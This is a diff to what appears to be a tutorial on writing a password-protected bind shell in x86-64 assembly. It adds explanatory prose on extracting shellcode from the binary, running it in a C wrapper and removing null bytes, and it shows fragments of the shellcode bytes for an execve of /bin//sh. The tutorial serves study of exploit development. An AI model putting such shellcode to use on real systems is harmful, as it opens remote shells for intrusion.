@@ -353,6 +353,8 @@ syscall ;execve syscall instruction
 
 Ok, that last part was quite a confusing bit, but after a few times you should get it.
 
+The complete Assembly code can be found [here](https://github.com/J33R4FF3/Pass_Bind_Shell) as Pass_Bind_Shell.nasm. 
+
 And that's it, we can now compile and run it and we should be presented with the same capabilities of our C program.
 
 ```bash
@@ -376,6 +378,9 @@ whoami
 kali
 ```
 
+We could just stop here and call our Assembly code a success but our final goal is to generate shellcode that will be usable if we ever come across a buffer overflow vulnerability for example. So let's see how our code holds up as shellcode.
+
+We can easily extract all the shellcode from our compiled binary with a little bit of bash scripting, as is shown below:
 
 ```bash
 ┌──(kali㉿kali)-[~/pass_bind_nasm]
@@ -391,6 +396,8 @@ kali
 \x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05
 \x38\x62\x79\x74\x65\x73\x73\x73\xb8\x3c\x00\x00\x00\x0f\x05
 ```
+
+We will then copy this shellcode into a little C wrapper program that will print out the byte length of our shellcode and execute the shellcode for us:
 
 ```c
 #include<stdio.h>
@@ -420,6 +427,7 @@ int main()
 }
 ```
 
+If we compile this new program and run it, we see that we get a segmentation fault and the length is given as 2 bytes. We can see that the program gave us a segmentation fault as soon as it hit the 3rd byte x00. This is because null bytes are not allowed in shellcode as it represents "End Of String". As a last step, we need to make sure that we remove all null bytes from our shellcode.
 
 ```bash
 ┌──(kali㉿kali)-[~/pass_bind_nasm]
@@ -430,6 +438,7 @@ Shellcode Length:  2
 Segmentation fault
 ```
 
+<h2>Removing null bytes from generated shellcode</h2>
 
 ```bash
 ┌──(kali㉿kali)-[~/pass_bind_nasm]
